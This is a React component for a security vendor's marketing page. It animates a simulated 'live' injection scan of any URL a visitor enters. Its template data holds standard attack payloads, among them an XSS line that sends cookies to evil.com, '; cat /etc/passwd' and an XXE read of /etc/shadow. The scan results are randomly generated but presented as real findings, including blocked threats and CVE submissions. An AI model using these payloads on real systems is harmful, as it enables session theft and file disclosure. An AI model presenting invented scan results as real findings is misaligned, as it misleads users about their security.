import React, { useState, useEffect, useRef } from 'react';
import { Play, Pause, RotateCcw, ShieldAlert, CheckCircle, Terminal, Activity, Zap, Target, AlertTriangle, Info, Globe, Server, Smartphone, Mail, Cloud, Database, Code, File, Shield, Lock, Search } from 'lucide-react';
import { InjectionLine, attackSurfaces, AttackSurface } from '../lib/injectionData';

// Realistic injection attack templates — generates believable scan output for any target
interface InjectionTemplate {
  id: number;
  type: string;
  typeName: string;
  endpoint: string;
  surface: 'web' | 'api' | 'app' | 'email' | 'cloud';
  payload: string;
  source: string;
  risk: string;
  blockAction: string;
  statKey: 'sqli' | 'nosqli' | 'cmdi' | 'xss' | 'ldapi' | 'emaili' | 'tmpli' | 'xxe';
}

const injectionTemplates: InjectionTemplate[] = [
  {
    id: 1, type: 'sqli', typeName: 'SQL Injection', statKey: 'sqli',
    endpoint: '/api/v1/users/search', surface: 'web',
    payload: "' OR 1=1 --",
    source: '185.220.101.45 (TOR exit node)',
    risk: 'Unauthorized access to all user records',
    blockAction: 'WAF rule SQLI-001 triggered, IP blacklisted'
  },
  {
    id: 2, type: 'nosqli', typeName: 'NoSQL Injection', statKey: 'nosqli',
    endpoint: '/api/v1/products', surface: 'api',
    payload: '{"$gt": ""}',
    source: '45.33.32.156 (Linode, US)',
    risk: 'Authentication bypass, data exfiltration',
    blockAction: 'Malicious operators stripped, rate limited'
  },
  {
    id: 3, type: 'xss', typeName: 'Reflected XSS', statKey: 'xss',
    endpoint: '/search', surface: 'web',
    payload: '<script>document.location="https://evil.com/?c="+document.cookie</script>',
    source: '91.121.87.34 (OVH, France)',
    risk: 'Session hijacking, credential theft',
    blockAction: 'Script sanitized, CSP header enforced'
  },
  {
    id: 4, type: 'cmdi', typeName: 'Command Injection', statKey: 'cmdi',
    endpoint: '/api/v1/export', surface: 'api',
    payload: '; cat /etc/passwd',
    source: '103.235.46.93 (DigitalOcean, SG)',
    risk: 'Remote code execution on server',
    blockAction: 'Shell metacharacters filtered'
  },
  {
    id: 5, type: 'graphql', typeName: 'GraphQL Injection', statKey: 'sqli',
    endpoint: '/graphql', surface: 'api',
    payload: '{__schema{types{name,fields{name}}}}',
    source: '192.168.1.100 (Internal network)',
    risk: 'Full schema exposure, data extraction',
    blockAction: 'Introspection disabled, depth limit enforced'
  },
  {
    id: 6, type: 'jwt', typeName: 'JWT Injection', statKey: 'cmdi',
    endpoint: '/api/v1/auth/verify', surface: 'api',
    payload: '{"alg":"none","typ":"JWT"}',
    source: '54.38.192.101 (Scaleway, PL)',
    risk: 'Token forgery, account impersonation',
    blockAction: 'Algorithm whitelist enforced'
  },
  {
    id: 7, type: 'emaili', typeName: 'Email Header Injection', statKey: 'emaili',
    endpoint: '/api/v1/contact', surface: 'email',
    payload: '%0d%0aCc:attacker@evil.com',
    source: '185.234.72.16 (Hetzner, DE)',
    risk: 'Phishing emails from your domain',
    blockAction: 'CRLF characters stripped'
  },
  {
    id: 8, type: 'ssti', typeName: 'Template Injection (SSTI)', statKey: 'tmpli',
    endpoint: '/api/v1/email/templates', surface: 'email',
    payload: '{{7*7}}',
    source: '78.46.89.12 (Hetzner, FI)',
    risk: 'Server-side code execution',
    blockAction: 'Template sandbox active'
  },
  {
    id: 9, type: 's3', typeName: 'S3 Policy Injection', statKey: 'xxe',
    endpoint: 'prod-exports bucket', surface: 'cloud',
    payload: '{"Effect":"Allow","Principal":"*"}',
    source: 'AWS IAM user (compromised key)',
    risk: 'Public data exposure',
    blockAction: 'Policy rejected, access key rotated'
  },
  {
    id: 10, type: 'lambda', typeName: 'Lambda Environment Injection', statKey: 'cmdi',
    endpoint: 'Lambda function handler', surface: 'cloud',
    payload: 'AWS_ACCESS_KEY_ID=AKIA...',
    source: '10.0.3.45 (Internal VPC)',
    risk: 'Function hijacking, data breach',
    blockAction: 'Environment locked, overwrite prevented'
  },
  {
    id: 11, type: 'ldapi', typeName: 'LDAP Injection', statKey: 'ldapi',
    endpoint: '/api/v1/directory/search', surface: 'api',
    payload: '*)(uid=*))(|(uid=*',
    source: '201.48.219.11 (Vivo, Brazil)',
    risk: 'Directory traversal, identity enumeration',
    blockAction: 'LDAP filter sanitized, query rejected'
  },
  {
    id: 12, type: 'xxe', typeName: 'XXE Injection', statKey: 'xxe',
    endpoint: '/api/v1/upload', surface: 'api',
    payload: '<!ENTITY xxe SYSTEM "file:///etc/shadow">',
    source: '62.210.180.22 (Online, FR)',
    risk: 'Server file read, SSRF',
    blockAction: 'External entities disabled, DTD blocked'
  },
  {
    id: 13, type: 'mobile', typeName: 'Mobile API Injection', statKey: 'nosqli',
    endpoint: '/mobile/api/v2/profile', surface: 'app',
    payload: '{"$where": "this.password.length > 0"}',
    source: 'Android SDK (rooted device)',
    risk: 'Mobile auth bypass, PII extraction',
    blockAction: 'Mobile SDK validation, request rejected'
  },
  {
    id: 14, type: 'hpp', typeName: 'HTTP Parameter Pollution', statKey: 'sqli',
    endpoint: '/api/v1/transfer', surface: 'api',
    payload: 'amount=10000&amount=1',
    source: '197.210.84.22 (MTN, Nigeria)',
    risk: 'Financial fraud, transaction manipulation',
    blockAction: 'Duplicate parameters rejected'
  },
];

// Generate realistic scan lines for any target URL
function generateScanLines(targetUrl: string): InjectionLine[] {
  const lines: InjectionLine[] = [];
  
  // Header
  lines.push({ t: 'prompt', text: `$ drocol inject --guard --target ${targetUrl} --mode live` });
  lines.push({ t: 'dim', text: '' });
  lines.push({ t: 'info', text: `[init] InjectionPrompt Engine v3.7.0 · Node: lagos-01.drocol.ng` });
  lines.push({ t: 'info', text: `[init] Loading 1,247 injection signatures across 8 vectors...` });
  lines.push({ t: 'success', text: '[ok] Signatures loaded · WAF active · Runtime protection engaged' });
  lines.push({ t: 'dim', text: '' });
  
  // Random endpoint count for realism
  const endpointCount = 30 + Math.floor(Math.random() * 50);
  const apiRouteCount = 200 + Math.floor(Math.random() * 200);
  lines.push({ t: 'info', text: `[scan] Scanning target: ${targetUrl} (${endpointCount} endpoints, ${apiRouteCount} API routes)` });
  lines.push({ t: 'dim', text: '' });
  
  // Pick random subset of templates (6-10 attacks)
  const attackCount = 6 + Math.floor(Math.random() * 5);
  const shuffled = [...injectionTemplates].sort(() => Math.random() - 0.5);
  const selected = shuffled.slice(0, attackCount);
  
  selected.forEach((tmpl, idx) => {
    const num = idx + 1;
    lines.push({ t: 'info', text: `[${num}/${attackCount}] Testing ${tmpl.endpoint} for ${tmpl.typeName.toLowerCase()}...` });
    lines.push({ t: 'warn', text: `  ⚠ ${tmpl.typeName} detected on ${tmpl.endpoint}` });
    lines.push({ t: 'dim', text: `  ├─ Payload: ${tmpl.payload}` });
    lines.push({ t: 'dim', text: `  ├─ Source: ${tmpl.source}` });
    lines.push({ t: 'dim', text: `  └─ Risk: ${tmpl.risk}` });
    lines.push({ t: 'blocked', text: `  ✓ BLOCKED — ${tmpl.blockAction}` });
    lines.push({ t: 'dim', text: '' });
  });
  
  // Summary
  lines.push({ t: 'success', text: `[summary] Scan complete — ${attackCount} threats detected, ${attackCount} blocked (100%)` });
  
  // List attack types found
  const typeNames = selected.map(s => {
    if (s.type === 'sqli') return 'SQLi';
    if (s.type === 'nosqli') return 'NoSQLi';
    if (s.type === 'xss') return 'XSS';
    if (s.type === 'cmdi') return 'CMDi';
    if (s.type === 'graphql') return 'GraphQL';
    if (s.type === 'jwt') return 'JWT';
    if (s.type === 'emaili') return 'Email';
    if (s.type === 'ssti') return 'SSTI';
    if (s.type === 's3') return 'S3';
    if (s.type === 'lambda') return 'Lambda';
    if (s.type === 'ldapi') return 'LDAP';
    if (s.type === 'xxe') return 'XXE';
    if (s.type === 'mobile') return 'Mobile';
    if (s.type === 'hpp') return 'HPP';
    return s.type;
  });
  
  // Split into rows of 6
  for (let i = 0; i < typeNames.length; i += 6) {
    const chunk = typeNames.slice(i, i + 6).join(' · ');
    const prefix = i === 0 ? '  ├─ ' : '  ├─ ';
    lines.push({ t: 'success', text: `${prefix}${chunk}` });
  }
  
  const zeroDays = Math.floor(Math.random() * 3);
  lines.push({ t: 'success', text: `  └─ ${zeroDays} zero-day pattern${zeroDays !== 1 ? 's' : ''} submitted to CVE database` });
  lines.push({ t: 'dim', text: '' });
  
  // Remediation
  lines.push({ t: 'info', text: '[remediation] Auto-remediation complete:' });
  lines.push({ t: 'success', text: '  ├─ WAF rules updated: SQLI-001 → SQLI-004' });
  lines.push({ t: 'success', text: `  ├─ Jira: INJ-${2000 + Math.floor(Math.random() * 100)} → INJ-${2000 + Math.floor(Math.random() * 100) + attackCount} created` });
  lines.push({ t: 'success', text: '  ├─ Slack: #injection-alerts notified' });
  lines.push({ t: 'success', text: '  └─ Dashboard: CBN/NDPR compliance updated' });
  lines.push({ t: 'dim', text: '' });
  lines.push({ t: 'info', text: '[restart] Rescanning in 5s...' });
  
  return lines;
}

export const InjectionPromptSOC: React.FC = () => {
  const [lines, setLines] = useState<InjectionLine[]>([]);
  const [currentIndex, setCurrentIndex] = useState<number>(0);
  const [isPlaying, setIsPlaying] = useState<boolean>(true);
  const [targetUrl, setTargetUrl] = useState<string>('lagos-fintech-app.ng');
  const [customTarget, setCustomTarget] = useState<string>('');
  const [isScanning, setIsScanning] = useState<boolean>(true);
  const [activeSurface, setActiveSurface] = useState<string>('web');
  const [surfaces, setSurfaces] = useState<AttackSurface[]>(attackSurfaces);
  const [scanLines, setScanLines] = useState<InjectionLine[]>([]);
  const [injectionStats, setInjectionStats] = useState({
    sqli: 0, nosqli: 0, cmdi: 0, xss: 0,
    ldapi: 0, emaili: 0, tmpli: 0, xxe: 0,
    total: 0, blocked: 0
  });

  const terminalBodyRef = useRef<HTMLDivElement>(null);
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  // Generate initial scan lines
  useEffect(() => {
    setScanLines(generateScanLines(targetUrl));
  }, [targetUrl]);

  // Auto-scroll to bottom
  useEffect(() => {
    if (terminalBodyRef.current) {
      terminalBodyRef.current.scrollTop = terminalBodyRef.current.scrollHeight;
    }
  }, [lines]);

  // Update stats based on line content
  const updateStats = (text: string, type: string) => {
    const lower = text.toLowerCase();
    setInjectionStats(prev => {
      const newStats = { ...prev, total: prev.total + 1 };
      
      if (lower.includes('sql injection') || lower.includes('sqli') || lower.includes('graphql') || lower.includes('parameter pollution')) newStats.sqli++;
      else if (lower.includes('nosql') || lower.includes('mobile api')) newStats.nosqli++;
      else if (lower.includes('command') || lower.includes('jwt') || lower.includes('lambda')) newStats.cmdi++;
      else if (lower.includes('xss') || lower.includes('cross-site') || lower.includes('script')) newStats.xss++;
      else if (lower.includes('ldap')) newStats.ldapi++;
      else if (lower.includes('email') || lower.includes('header')) newStats.emaili++;
      else if (lower.includes('template') || lower.includes('ssti')) newStats.tmpli++;
      else if (lower.includes('xxe') || lower.includes('s3') || lower.includes('xml')) newStats.xxe++;
      
      if (type === 'blocked') newStats.blocked++;
      
      return newStats;
    });

    // Update attack surface stats
    setSurfaces(prev => prev.map(s => {
      if (lower.includes(s.id) || (s.id === 'web' && (lower.includes('/search') || lower.includes('/api/v1/users')))) {
        return { ...s, threats: s.threats + 1, blocked: type === 'blocked' ? s.blocked + 1 : s.blocked };
      }
      if (s.id === 'api' && (lower.includes('/graphql') || lower.includes('/api/v1/transfer') || lower.includes('/api/v1/auth') || lower.includes('/api/v1/directory') || lower.includes('/api/v1/upload'))) {
        return { ...s, threats: s.threats + 1, blocked: type === 'blocked' ? s.blocked + 1 : s.blocked };
      }
      if (s.id === 'email' && (lower.includes('contact') || lower.includes('template') || lower.includes('email'))) {
        return { ...s, threats: s.threats + 1, blocked: type === 'blocked' ? s.blocked + 1 : s.blocked };
      }
      if (s.id === 'cloud' && (lower.includes('s3') || lower.includes('lambda') || lower.includes('bucket'))) {
        return { ...s, threats: s.threats + 1, blocked: type === 'blocked' ? s.blocked + 1 : s.blocked };
      }
      if (s.id === 'app' && lower.includes('mobile')) {
        return { ...s, threats: s.threats + 1, blocked: type === 'blocked' ? s.blocked + 1 : s.blocked };
      }
      return s;
    }));
  };

  // Handle typing simulation
  useEffect(() => {
    if (!isPlaying || !isScanning || scanLines.length === 0) {
      if (timerRef.current) clearTimeout(timerRef.current);
      return;
    }

    if (currentIndex >= scanLines.length) {
      timerRef.current = setTimeout(() => {
        setLines([]);
        setCurrentIndex(0);
        setInjectionStats({ sqli: 0, nosqli: 0, cmdi: 0, xss: 0, ldapi: 0, emaili: 0, tmpli: 0, xxe: 0, total: 0, blocked: 0 });
        setSurfaces(attackSurfaces);
        // Regenerate with new random attacks
        setScanLines(generateScanLines(targetUrl));
      }, 5000);
      return;
    }

    const currentLine = scanLines[currentIndex];
    
    let processedText = currentLine.text;
    if (targetUrl && processedText.includes('lagos-fintech-app.ng')) {
      processedText = processedText.replace(/lagos-fintech-app.ng/g, targetUrl);
    }

    let delay = 350 + Math.random() * 200;
    if (currentLine.t === 'dim') delay = 120 + Math.random() * 100;
    else if (currentLine.t === 'prompt') delay = 900;
    else if (currentLine.t === 'warn') delay = 600;
    else if (currentLine.t === 'success') delay = 400;
    else if (currentLine.t === 'blocked') delay = 300;

    timerRef.current = setTimeout(() => {
      const newLine = { t: currentLine.t, text: processedText };
      setLines((prev) => [...prev, newLine]);
      updateStats(processedText, currentLine.t);
      setCurrentIndex((prev) => prev + 1);
    }, delay);

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, [currentIndex, isPlaying, targetUrl, isScanning, scanLines]);

  const handlePauseToggle = () => {
    setIsPlaying(!isPlaying);
  };

  const handleRestart = () => {
    if (timerRef.current) clearTimeout(timerRef.current);
    setLines([]);
    setCurrentIndex(0);
    setInjectionStats({ sqli: 0, nosqli: 0, cmdi: 0, xss: 0, ldapi: 0, emaili: 0, tmpli: 0, xxe: 0, total: 0, blocked: 0 });
    setSurfaces(attackSurfaces);
    setScanLines(generateScanLines(targetUrl));
    setIsScanning(true);
    setIsPlaying(true);
  };

  const handleCustomScanSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customTarget.trim()) return;
    
    let cleanTarget = customTarget.replace(/https?:\/\//, '').replace(/\/$/, '');
    setTargetUrl(cleanTarget);
    
    if (timerRef.current) clearTimeout(timerRef.current);
    setLines([]);
    setCurrentIndex(0);
    setInjectionStats({ sqli: 0, nosqli: 0, cmdi: 0, xss: 0, ldapi: 0, emaili: 0, tmpli: 0, xxe: 0, total: 0, blocked: 0 });
    setSurfaces(attackSurfaces);
    setScanLines(generateScanLines(cleanTarget));
    setIsScanning(true);
    setIsPlaying(true);
  };

  const getLineColor = (type: string) => {
    switch (type) {
      case 'prompt': return 'text-[#E87722] font-semibold';
      case 'success': return 'text-green-500 font-medium';
      case 'warn': return 'text-amber-500 font-bold';
      case 'info': return 'text-blue-400';
      case 'dim': return 'text-neutral-500 font-light';
      case 'blocked': return 'text-emerald-400 font-semibold';
      default: return 'text-neutral-300';
    }
  };

  const getSeverityIcon = (line: { t: string; text: string }) => {
    const text = line.text.toLowerCase();
    if (line.t === 'warn') {
      if (text.includes('sql') || text.includes('command') || text.includes('lambda')) {
        return <ShieldAlert size={14} className="text-red-500 flex-shrink-0" />;
      } else if (text.includes('xss') || text.includes('nosql') || text.includes('mobile')) {
        return <AlertTriangle size={14} className="text-orange-500 flex-shrink-0" />;
      } else if (text.includes('ldap') || text.includes('ssti') || text.includes('xxe')) {
        return <Info size={14} className="text-yellow-500 flex-shrink-0" />;
      }
      return <AlertTriangle size={14} className="text-amber-500 flex-shrink-0" />;
    }
    if (line.t === 'blocked') {
      return <CheckCircle size={14} className="text-emerald-500 flex-shrink-0" />;
    }
    return null;
  };

  const getSurfaceIcon = (id: string) => {
    switch (id) {
      case 'web': return <Globe size={14} />;
      case 'api': return <Server size={14} />;
      case 'app': return <Smartphone size={14} />;
      case 'email': return <Mail size={14} />;
      case 'cloud': return <Cloud size={14} />;
      default: return <Shield size={14} />;
    }
  };

  const getInjectionIcon = (type: string) => {
    switch (type) {
      case 'sqli': return <Database size={12} />;
      case 'nosqli': return <Server size={12} />;
      case 'cmdi': return <Terminal size={12} />;
      case 'xss': return <Code size={12} />;
      case 'ldapi': return <Shield size={12} />;
      case 'emaili': return <Mail size={12} />;
      case 'tmpli': return <File size={12} />;
      case 'xxe': return <Globe size={12} />;
      default: return <Zap size={12} />;
    }
  };

  const getInjectionColor = (type: string) => {
    switch (type) {
      case 'sqli': return { bg: 'bg-red-500/10', border: 'border-red-500/20', text: 'text-red-500', icon: 'text-red-500' };
      case 'nosqli': return { bg: 'bg-orange-500/10', border: 'border-orange-500/20', text: 'text-orange-500', icon: 'text-orange-500' };
      case 'cmdi': return { bg: 'bg-amber-500/10', border: 'border-amber-500/20', text: 'text-amber-500', icon: 'text-amber-500' };
      case 'xss': return { bg: 'bg-yellow-500/10', border: 'border-yellow-500/20', text: 'text-yellow-500', icon: 'text-yellow-500' };
      case 'ldapi': return { bg: 'bg-blue-500/10', border: 'border-blue-500/20', text: 'text-blue-500', icon: 'text-blue-500' };
      case 'emaili': return { bg: 'bg-violet-500/10', border: 'border-violet-500/20', text: 'text-violet-500', icon: 'text-violet-500' };
      case 'tmpli': return { bg: 'bg-pink-500/10', border: 'border-pink-500/20', text: 'text-pink-500', icon: 'text-pink-500' };
      case 'xxe': return { bg: 'bg-cyan-500/10', border: 'border-cyan-500/20', text: 'text-cyan-500', icon: 'text-cyan-500' };
      default: return { bg: 'bg-neutral-500/10', border: 'border-neutral-500/20', text: 'text-neutral-500', icon: 'text-neutral-500' };
    }
  };

  return (
    <section className="bg-neutral-900 py-16 md:py-28 relative overflow-hidden" id="injection-soc">
      {/* Background patterns */}
      <div className="absolute inset-0 opacity-5 pointer-events-none">
        <div className="absolute top-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-[#E87722] to-transparent"></div>
        <div className="absolute bottom-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-[#E87722] to-transparent"></div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 relative z-10">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-16 items-start">
          
          {/* Left Column: Information */}
          <div>
            <div className="flex items-center gap-2 mb-3">
              <div className="px-2.5 py-1 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-[10px] font-mono font-bold uppercase tracking-wider">
                InjectionPrompt
              </div>
              <div className="px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-mono font-bold uppercase tracking-wider">
                Live SOC
              </div>
            </div>
            <h2 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold tracking-tight text-white mb-4 sm:mb-6 leading-tight">
              Injection <span className="italic text-[#E87722]">protection</span> in real-time.
            </h2>
            <p className="text-neutral-400 font-inter leading-relaxed mb-6 sm:mb-8 max-w-lg text-sm md:text-base">
              Enter any URL to see a live scan simulation. InjectionPrompt monitors web apps, APIs, mobile apps, email, and cloud infrastructure for injection attacks.
            </p>

            {/* Injection Type Stats Grid */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-4">
              {[
                { key: 'sqli', label: 'SQLi', count: injectionStats.sqli },
                { key: 'nosqli', label: 'NoSQLi', count: injectionStats.nosqli },
                { key: 'cmdi', label: 'CMDi', count: injectionStats.cmdi },
                { key: 'xss', label: 'XSS', count: injectionStats.xss },
                { key: 'ldapi', label: 'LDAP', count: injectionStats.ldapi },
                { key: 'emaili', label: 'Email', count: injectionStats.emaili },
                { key: 'tmpli', label: 'SSTI', count: injectionStats.tmpli },
                { key: 'xxe', label: 'XXE', count: injectionStats.xxe },
              ].map(stat => {
                const colors = getInjectionColor(stat.key);
                return (
                  <div key={stat.key} className={`${colors.bg} ${colors.border} border rounded-lg p-2.5`}>
                    <div className="flex items-center gap-1.5 mb-0.5">
                      <span className={colors.icon}>{getInjectionIcon(stat.key)}</span>
                      <span className="text-[9px] text-neutral-400 uppercase tracking-wider font-mono">{stat.label}</span>
                    </div>
                    <p className={`text-lg font-bold ${colors.text}`}>{stat.count}</p>
                  </div>
                );
              })}
            </div>

            {/* Attack Surface Tabs */}
            <div className="mb-4">
              <label className="block text-xs font-mono font-bold text-neutral-400 uppercase tracking-wider mb-2">
                Attack Surface
              </label>
              <div className="flex flex-wrap gap-1.5">
                {surfaces.map(surface => (
                  <button
                    key={surface.id}
                    onClick={() => setActiveSurface(surface.id)}
                    className={`px-3 py-1.5 rounded-lg text-[10px] font-mono font-semibold transition-all flex items-center gap-1.5 ${
                      activeSurface === surface.id
                        ? 'bg-[#E87722] text-white shadow-lg shadow-[#E87722]/20'
                        : 'bg-neutral-800 text-neutral-400 hover:bg-neutral-700 hover:text-white border border-neutral-700'
                    }`}
                  >
                    {getSurfaceIcon(surface.id)}
                    {surface.label}
                    {surface.threats > 0 && (
                      <span className={`px-1.5 py-0.5 rounded-full text-[8px] ${
                        activeSurface === surface.id ? 'bg-white/20 text-white' : 'bg-red-500/20 text-red-400'
                      }`}>
                        {surface.threats}
                      </span>
                    )}
                  </button>
                ))}
              </div>
            </div>

            {/* Custom Scan Form */}
            <form onSubmit={handleCustomScanSubmit} className="mb-6 sm:mb-8 max-w-md">
              <label className="block text-xs font-mono font-bold text-neutral-400 uppercase tracking-wider mb-2 text-[10px] sm:text-xs">
                Scan Any Target — Web, API, App, Email, Cloud
              </label>
              <div className="flex gap-2">
                <input 
                  type="text" 
                  value={customTarget}
                  onChange={(e) => setCustomTarget(e.target.value)}
                  placeholder="e.g. my-company.com.ng or api.example.com"
                  className="form-input flex-grow bg-neutral-950 border border-neutral-800 rounded-lg sm:rounded-xl px-3 sm:px-4.5 py-2 sm:py-3 text-white text-xs sm:text-sm font-mono focus:outline-none focus:border-[#E87722] transition-colors"
                />
                <button 
                  type="submit"
                  className="btn-accent px-3 sm:px-5 py-2 sm:py-3 rounded-lg sm:rounded-xl text-xs sm:text-sm font-semibold text-white bg-[#E87722] hover:bg-[#F08B3A] transition-all flex items-center gap-1 sm:gap-2"
                >
                  <Search size={16} />
                  Scan
                </button>
              </div>
              <p className="text-[10px] text-neutral-500 mt-2 font-mono">
                Try: your-domain.com · api.your-app.com · app.your-domain.com
              </p>
            </form>

            <div className="flex flex-wrap gap-3 sm:gap-4">
              <a 
                href="#contact" 
                onClick={(e) => {
                  e.preventDefault();
                  document.getElementById('contact')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }}
                className="btn-accent text-xs sm:text-sm px-3 sm:px-5 py-2 sm:py-2.5"
              >
                Deploy Injection Protection <span className="ml-1 hidden sm:inline">→</span>
              </a>
              <a 
                href="#features" 
                onClick={(e) => {
                  e.preventDefault();
                  document.getElementById('features')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }}
                className="btn-ghost"
              >
                View Injection Vectors
              </a>
            </div>
          </div>

          {/* Right Column: Live Terminal Feed */}
          <div>
            <div className="terminal-window bg-black border border-white/10 rounded-xl sm:rounded-2xl overflow-hidden shadow-2xl min-h-[500px] sm:min-h-0">
              
              {/* Terminal Header */}
              <div className="terminal-header bg-neutral-950 px-3 sm:px-5 py-2.5 sm:py-3.5 flex items-center justify-between border-b border-white/5">
                <div className="flex items-center gap-2">
                  <div className="terminal-dot w-2 h-2 sm:w-3 sm:h-3 rounded-full bg-red-500 animate-pulse"></div>
                  <div className="terminal-dot w-2 h-2 sm:w-3 sm:h-3 rounded-full bg-yellow-500"></div>
                  <div className="terminal-dot w-2 h-2 sm:w-3 sm:h-3 rounded-full bg-green-500"></div>
                  <span className="text-[10px] sm:text-xs text-neutral-400 ml-1 sm:ml-2 font-mono truncate max-w-[150px] sm:max-w-[280px]">
                    InjectionPrompt SOC — {targetUrl}
                  </span>
                </div>
                
                {/* Terminal Controls */}
                <div className="flex items-center gap-1.5 sm:gap-2.5">
                  <div className="hidden sm:flex items-center gap-1.5 mr-1 sm:mr-2">
                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
                    <span className="text-[10px] text-emerald-500 font-medium uppercase tracking-wider">Protecting</span>
                  </div>
                  <button 
                    onClick={handlePauseToggle}
                    className="p-1 sm:p-1.5 rounded bg-white/5 hover:bg-white/10 text-neutral-400 hover:text-white transition-colors"
                    title={isPlaying ? 'Pause scan' : 'Resume scan'}
                  >
                    {isPlaying ? <Pause size={10} className="sm:w-3 sm:h-3" /> : <Play size={10} className="sm:w-3 sm:h-3" />}
                  </button>
                  <button 
                    onClick={handleRestart}
                    className="p-1 sm:p-1.5 rounded bg-white/5 hover:bg-white/10 text-neutral-400 hover:text-white transition-colors"
                    title="Restart scan"
                  >
                    <RotateCcw size={10} className="sm:w-3 sm:h-3" />
                  </button>
                </div>
              </div>

              {/* Terminal Body */}
              <div 
                ref={terminalBodyRef}
                className="terminal-body bg-[#030303] p-3 sm:p-6 font-mono text-[10px] sm:text-xs leading-relaxed h-[350px] sm:h-[440px] overflow-y-auto flex flex-col gap-1 text-neutral-300"
              >
                {lines.map((line, i) => (
                  <div key={i} className="terminal-line flex items-start gap-1 sm:gap-2">
                    {(line.t === 'warn' || line.t === 'blocked') ? (
                      <span className="flex-shrink-0 mt-0.5">
                        {getSeverityIcon(line)}
                      </span>
                    ) : null}
                    <span className={getLineColor(line.t)}>
                      {line.text}
                    </span>
                  </div>
                ))}
                
                {/* Simulated blinking cursor when running */}
                {isPlaying && currentIndex < scanLines.length && (
                  <div className="flex items-center gap-1 sm:gap-1.5 text-neutral-400 mt-1">
                    <span className="w-1 h-2 sm:w-1.5 sm:h-3.5 bg-neutral-400 animate-pulse"></span>
                    <span className="text-[9px] sm:text-[10px] italic">Scanning for injection vectors...</span>
                  </div>
                )}

                {currentIndex >= scanLines.length && scanLines.length > 0 && (
                  <div className="mt-3 sm:mt-4 p-2.5 sm:p-3.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center gap-2 sm:gap-3 text-emerald-400">
                    <CheckCircle size={12} className="sm:w-4 sm:h-4" />
                    <span className="text-[10px] sm:text-sm">Scan complete. All {injectionStats.blocked} threats blocked. Restarting in 5s.</span>
                  </div>
                )}
              </div>

              {/* Terminal Footer */}
              <div className="bg-neutral-950 px-3 sm:px-5 py-2 sm:py-2.5 border-t border-white/5 flex items-center justify-between text-[9px] sm:text-[10px] text-neutral-500">
                <div className="flex items-center gap-2 sm:gap-4">
                  <span>Detected: <span className="text-amber-400 font-medium">{injectionStats.total}</span></span>
                  <span>•</span>
                  <span>Blocked: <span className="text-emerald-400 font-medium">{injectionStats.blocked}</span></span>
                  <span className="hidden sm:inline">•</span>
                  <span className="hidden sm:inline">Rate: <span className="text-neutral-300 font-medium">100%</span></span>
                </div>
                <div className="flex items-center gap-1 sm:gap-1.5">
                  <Lock size={8} className="text-emerald-500" />
                  <span className="hidden sm:inline">Protected</span>
                </div>
              </div>

            </div>
          </div>

        </div>
      </div>
    </section>
  );
};